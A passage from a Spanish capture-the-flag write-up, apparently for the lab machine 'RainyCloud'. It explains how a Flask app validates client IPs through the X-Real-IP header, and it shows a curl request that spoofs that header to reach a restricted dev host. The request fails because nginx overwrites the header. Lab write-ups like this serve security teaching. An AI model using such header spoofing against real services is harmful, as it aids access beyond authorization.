+<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">Response</span><span class="mtk1">(</span><span class="mtk1">output</span><span class="mtk1">, </span><span class="mtk9 mtki">mimetype</span><span class="mtk5">=</span><span class="mtk4">"text/plain"</span><span class="mtk1">, </span><span class="mtk9 mtki">headers</span><span class="mtk5">=</span><span class="mtk1">{</span><span class="mtk4">"Content-Disposition"</span><span class="mtk1">: </span><span class="mtk4">"attachment; filename=command_output.txt"</span><span class="mtk1">})</span>
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"Success"</span>
+</code></pre></div><h3 id="validación-de-la-dirección-ip">Validación de la dirección IP</h3><p>El código emplea la cabecera <code>X-Real-IP</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">ValidateIP</span><span class="mtk1">(</span><span class="mtk9 mtki">ip</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">ip</span><span class="mtk1">.startswith(</span><span class="mtk4">"10."</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">ip</span><span class="mtk1">.startswith(</span><span class="mtk4">"172."</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">True</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">ip</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"127.0.0.1"</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">True</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
+
+<span class="mtk3"># APP CODE</span>
+<span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">before_request</span>
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">before</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">o</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">urlparse</span><span class="mtk1">(</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">base_url</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">ip</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">remote_addr</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk4">"X-Real-IP"</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">headers</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">headers</span><span class="mtk1">[</span><span class="mtk4">'X-Real-IP'</span><span class="mtk1">]</span>  
+<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"[before] </span><span class="mtk6">{</span><span class="mtk1">o</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"[before] </span><span class="mtk6">{</span><span class="mtk1">ip</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">o</span><span class="mtk1">.</span><span class="mtk1">hostname</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> [</span><span class="mtk4">"dev.rainycloud.htb"</span><span class="mtk1">, </span><span class="mtk4">"rainycloud.htb"</span><span class="mtk1">]:</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://rainycloud.htb</span><span class="mtk4">"</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">g</span><span class="mtk1">.dev </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">True</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">o</span><span class="mtk1">.</span><span class="mtk1">hostname</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"dev.rainycloud.htb"</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk6">False</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk8">ValidateIP</span><span class="mtk1">(</span><span class="mtk1">ip</span><span class="mtk1">) </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk1">g</span><span class="mtk1">.dev:</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"Access Denied - Invalid IP"</span><span class="mtk1">, </span><span class="mtk6">403</span>
+</code></pre></div><p>No obstante, incluso si la añadimos, no podemos acceder a <code>dev.rainycloud.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.184 -H <span class="code-dark-yellow">'X-Real-IP: 172.18.0.3'</span> -H <span class="code-dark-yellow">'Host: dev.rainycloud.htb'</span>  
+Access Denied - Invalid IP
+</code></pre></div><p>Y la razón es la configuración de nginx (<code>/etc/nginx/sites-available/default</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">server</span> {
+    <span class="mtk7">listen</span> <span class="mtk6">80</span> default_server;
+    <span class="mtk7">listen</span> [::]:80 default_server;
+
+    <span class="mtk7">root</span> /var/www/rainycloud;
+
+    <span class="mtk7">index</span> index.html index.htm index.nginx-debian.html;  
+
+    <span class="mtk7">server_name</span> rainycloud.htb;
+
+    <span class="mtk8">location</span> / {
+        <span class="mtk7">proxy_set_header</span> Host <span class="mtk4">$host</span>;
+        <span class="mtk7">proxy_set_header</span> X-Real-IP <span class="mtk4">$remote_addr</span>;
+        <span class="mtk7">proxy_pass</span> http://172.17.0.1:8080;
+    }
+}
+</code></pre></div><p>La cabecera <code>X-Real-IP</code> se sobrescribe por nginx usando <code>$remote_addr</code>, por lo que no nos lo podemos saltar.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-de-usuarios">Enumeración de usuarios</a></li><li><a href="#ataque-de-fuerza-bruta">Ataque de fuerza bruta</a></li><li><a href="#enumeración-de-archivos-de-javascript">Enumeración de archivos de JavaScript</a></li><li><a href="#enumeración-del-contenedor">Enumeración del contenedor</a></li><li><a href="#acceso-al-entorno-de-desarrollo">Acceso al entorno de desarrollo</a></li><li><a href="#enumeración-de-api">Enumeración de API</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#leyendo-archivos-del-servidor">Leyendo archivos del servidor</a></li><li><a href="#acceso-al-contenedor-de-jack">Acceso al contenedor de <code>jack</code></a></li><li><a href="#acceso-mediante-ssh">Acceso mediante SSH</a></li></ul></li><li><a href="#movimiento-lateral-al-usuario-jack_adm">Movimiento lateral al usuario <code>jack_adm</code></a><ul><li><a href="#escape-del-_sandbox_-de-python">Escape del <em>sandbox</em> de Python</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#encontrando-la-pimienta-secreta">Encontrando la pimienta secreta</a></li><li><a href="#rompiendo-el-_hash_-de-root">Rompiendo el <em>hash</em> de <code>root</code></a></li></ul></li><li><a href="#aclaraciones">Aclaraciones</a><ul><li><a href="#_type-juggling_-en-la-api"><em>Type Juggling</em> en la API</a></li><li><a href="#enumeración-de-usuarios-1">Enumeración de usuarios</a></li><li><a href="#inspección-de-procesos-desde-los-contenedores">Inspección de procesos desde los contenedores</a></li><li><a href="#validación-de-la-dirección-ip">Validación de la dirección IP</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
